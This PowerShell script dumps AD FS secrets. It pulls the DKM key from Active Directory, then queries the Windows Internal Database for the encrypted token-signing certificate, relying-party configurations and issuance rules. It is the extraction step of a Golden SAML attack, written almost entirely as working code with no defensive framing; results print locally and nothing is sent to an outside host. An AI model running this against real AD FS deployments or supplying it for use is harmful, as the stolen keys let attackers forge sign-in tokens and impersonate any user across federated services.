function Get-DKMKey {
    Import-Module ActiveDirectory
    
    # Function to get the DKM Key
    function Get-DKMKey {
        param (
            [string]$domain = (Get-ADDomain).DNSRoot,
            [string]$server = (Get-ADDomainController).Name
        )
    
        
        $domainComponents = $domain -split '\.'
        $dcString = ($domainComponents | ForEach-Object { "DC=$_" }) -join ','
    
        $searchBase = "CN=ADFS,CN=Microsoft,CN=Program Data,$dcString"
    
      
        try {
            $key = (Get-ADObject -Filter 'ObjectClass -eq "Contact" -and name -ne "CryptoPolicy"' -SearchBase $searchBase -Properties thumbnailPhoto).thumbnailPhoto
            if ($key) {
                $keyString = [System.BitConverter]::ToString($key)
                Write-Output "DKM Key: $keyString"
                 Write-Output "Domain is: $domain"
            } else {
                Write-Output "DKM Key not found."
            }
        } catch {
            Write-Output "Error: $_"
        }
    }
    
    # Example usage
    Get-DKMKey
    
    }
    
    
    
    
    if (-not (Get-Module -ListAvailable -Name SqlServer)) {
        Install-Module -Name SqlServer -Force -AllowClobber
    }
    Import-Module SqlServer
    
    
    $WidConnectionString = "Data Source=np:\\.\pipe\microsoft##wid\tsql\query;Integrated Security=True"
    $WidConnectionStringLegacy = "Data Source=np:\\.\pipe\MSSQL$MICROSOFT##SSEE\sql\query"
    $ReadEncryptedPfxQuery = "SELECT ServiceSettingsData FROM {0}.IdentityServerPolicy.ServiceSettings"
    $ReadScopePolicies = "SELECT SCOPES.ScopeId, SCOPES.Name, SCOPES.WSFederationPassiveEndpoint, SCOPES.Enabled, SCOPES.SignatureAlgorithm, SCOPES.EntityId, SCOPES.EncryptionCertificate, SCOPES.MustEncryptNameId, SCOPES.SamlResponseSignatureType, SCOPES.ParameterInterface, SAML.Binding, SAML.Location, POLICYTEMPLATE.name, POLICYTEMPLATE.PolicyMetadata, POLICYTEMPLATE.InterfaceVersion, SCOPEIDS.IdentityData FROM {0}.IdentityServerPolicy.Scopes SCOPES LEFT OUTER JOIN {0}.IdentityServerPolicy.ScopeAssertionConsumerServices SAML ON SCOPES.ScopeId = SAML.ScopeId LEFT OUTER JOIN {0}.IdentityServerPolicy.PolicyTemplates POLICYTEMPLATE ON SCOPES.PolicyTemplateId = POLICYTEMPLATE.PolicyTemplateId LEFT OUTER JOIN {0}.IdentityServerPolicy.ScopeIdentities SCOPEIDS ON SCOPES.ScopeId = SCOPEIDS.ScopeId"
    $ReadScopePoliciesLegacy = "SELECT SCOPES.ScopeId, SCOPES.Name, SCOPES.WSFederationPassiveEndpoint, SCOPES.Enabled, SCOPES.SignatureAlgorithm, SCOPES.EntityId, SCOPES.EncryptionCertificate, SCOPES.MustEncryptNameId, SCOPES.SamlResponseSignatureType, SAML.Binding, SAML.Location, SCOPEIDS.IdentityData FROM {0}.IdentityServerPolicy.Scopes SCOPES LEFT OUTER JOIN {0}.IdentityServerPolicy.ScopeAssertionConsumerServices SAML ON SCOPES.ScopeId = SAML.ScopeId LEFT OUTER JOIN {0}.IdentityServerPolicy.ScopeIdentities SCOPEIDS ON SCOPES.ScopeId = SCOPEIDS.ScopeId"
    $ReadRules = "SELECT SCOPE.ScopeId, SCOPE.name, POLICIES.PolicyData, POLICIES.PolicyType, POLICIES.PolicyUsage FROM {0}.IdentityServerPolicy.Scopes SCOPE INNER JOIN {0}.IdentityServerPolicy.ScopePolicies SCOPEPOLICIES ON SCOPE.ScopeId = SCOPEPOLICIES.ScopeId INNER JOIN {0}.IdentityServerPolicy.Policies POLICIES ON SCOPEPOLICIES.PolicyId = POLICIES.PolicyId"
    $ReadDatabases = "SELECT name FROM sys.databases"
    $AdfsConfigTable = "AdfsConfiguration"
    $Adfs2012R2 = "AdfsConfiguration"
    $Adfs2016 = "AdfsConfigurationV3"
    $Adfs2019 = "AdfsConfigurationV4"
    
    # Function to get AD FS version
    function Get-AdfsVersion {
        param (
            [System.Data.SqlClient.SqlConnection]$conn
        )
        $cmd = New-Object System.Data.SqlClient.SqlCommand($ReadDatabases, $conn)
        $reader = $cmd.ExecuteReader()
        while ($reader.Read()) {
            $dbName = $reader["name"]
            if ($dbName -like "*$AdfsConfigTable*") {
                $reader.Close()
                return $dbName
            }
        }
        $reader.Close()
        return $null
    }
    
    # Function to read encrypted PFX
    function Read-EncryptedPfx {
        param (
            [string]$dbName,
            [System.Data.SqlClient.SqlConnection]$conn
        )
        $query = $ReadEncryptedPfxQuery -f $dbName
        $cmd = New-Object System.Data.SqlClient.SqlCommand($query, $conn)
        $reader = $cmd.ExecuteReader()
        while ($reader.Read()) {
            $xmlString = $reader["ServiceSettingsData"]
            $xmlDocument = New-Object System.Xml.XmlDocument
            $xmlDocument.LoadXml($xmlString)
            $root = $xmlDocument.DocumentElement
            $signingToken = $root.GetElementsByTagName("SigningToken")[0]
            if ($signingToken) {
                $encryptedPfx = $signingToken.GetElementsByTagName("EncryptedPfx")[0].InnerText
                $findValue = $signingToken.GetElementsByTagName("FindValue")[0].InnerText
                $storeLocationValue = $signingToken.GetElementsByTagName("StoreLocationValue")[0].InnerText
                $storeNameValue = $signingToken.GetElementsByTagName("StoreNameValue")[0].InnerText
                Write-Output "Encrypted Token Signing Key: $encryptedPfx"
                Write-Output "Certificate value: $findValue"
                Write-Output "Store location value: $storeLocationValue"
                Write-Output "Store name value: $storeNameValue"
            }
        }
        $reader.Close()
    }
    
    # Function to read scope policies
    function Read-ScopePolicies {
        param (
            [string]$dbName,
            [System.Data.SqlClient.SqlConnection]$conn
        )
        $query = if ($dbName -eq $Adfs2012R2) { $ReadScopePoliciesLegacy -f $dbName } else { $ReadScopePolicies -f $dbName }
        $cmd = New-Object System.Data.SqlClient.SqlCommand($query, $conn)
        $reader = $cmd.ExecuteReader()
        while ($reader.Read()) {
            $scopeId = $reader["ScopeId"]
            $name = $reader["Name"]
            if ($name -notmatch "SelfScope|ProxyTrustProvisionRelyingParty|Device Registration Service|UserInfo|PRTUpdateRp|Windows Hello - Certificate Provisioning Service|urn:AppProxy:com") {
                $rp = @{
                    Name = $name
                    Id = $scopeId
                    IsEnabled = $reader["Enabled"]
                    SignatureAlgorithm = $reader["SignatureAlgorithm"]
                    Identity = $reader["IdentityData"]
                    FederationEndpoint = if ($reader["WSFederationPassiveEndpoint"]) { $reader["WSFederationPassiveEndpoint"] } else { $reader["Location"] }
                    EncryptionCert = $reader["EncryptionCertificate"]
                    SamlResponseSignatureType = $reader["SamlResponseSignatureType"]
                    IsSaml = $reader["Location"] -ne $null
                    IsWsFed = $reader["WSFederationPassiveEndpoint"] -ne $null
                }
                Write-Output $rp
            }
        }
        $reader.Close()
    }
    
    # Function to read rules
    function Read-Rules {
        param (
            [string]$dbName,
            [System.Data.SqlClient.SqlConnection]$conn,
            [hashtable]$rps
        )
        $query = $ReadRules -f $dbName
        $cmd = New-Object System.Data.SqlClient.SqlCommand($query, $conn)
        $reader = $cmd.ExecuteReader()
        while ($reader.Read()) {
            $scopeId = $reader["ScopeId"]
            $rule = $reader["PolicyData"]
            if ($rps.ContainsKey($scopeId) -and $rule) {
                $policyType = [int]$reader["PolicyUsage"]
                switch ($policyType) {
                    0 { $rps[$scopeId]["StrongAuthRules"] = $rule }
                    1 { $rps[$scopeId]["OnBehalfAuthRules"] = $rule }
                    2 { $rps[$scopeId]["AuthRules"] = $rule }
                    3 { $rps[$scopeId]["IssuanceRules"] = $rule }
                }
            }
        }
        $reader.Close()
    }
    
    # Main Function
    function Read-ConfigurationDb {
        param (
            [hashtable]$arguments
        )
        $osVersion = [System.Environment]::OSVersion.Version
        $connectionString = if (($osVersion.Major -eq 6 -and $osVersion.Minor -le 1) -or $osVersion.Major -lt 6) { $WidConnectionStringLegacy } else { $WidConnectionString }
        if ($arguments.ContainsKey("/database")) { $connectionString = $arguments["/database"] }
        try {
            $conn = New-Object System.Data.SqlClient.SqlConnection($connectionString)
            $conn.Open()
        } catch {
            Write-Output "Error connecting to database using connection string: $connectionString"
            return $null
        }
        $dbName = Get-AdfsVersion -conn $conn
        if (-not $dbName) {
            Write-Output "Error identifying AD FS version"
            return $null
        }
        Read-EncryptedPfx -dbName $dbName -conn $conn
        $rps = @{}
        Read-ScopePolicies -dbName $dbName -conn $conn | ForEach-Object { $rps[$_.Id] = $_ }
        Read-Rules -dbName $dbName -conn $conn -rps $rps
        $conn.Close()
        return $rps.Values
    }
    
    
    # Dump out the values we want
    $arguments = @{}
    $rps = Read-ConfigurationDb -arguments $arguments
    $rps | ForEach-Object { Write-Output $_ }
    
    Get-DKMKey
    
    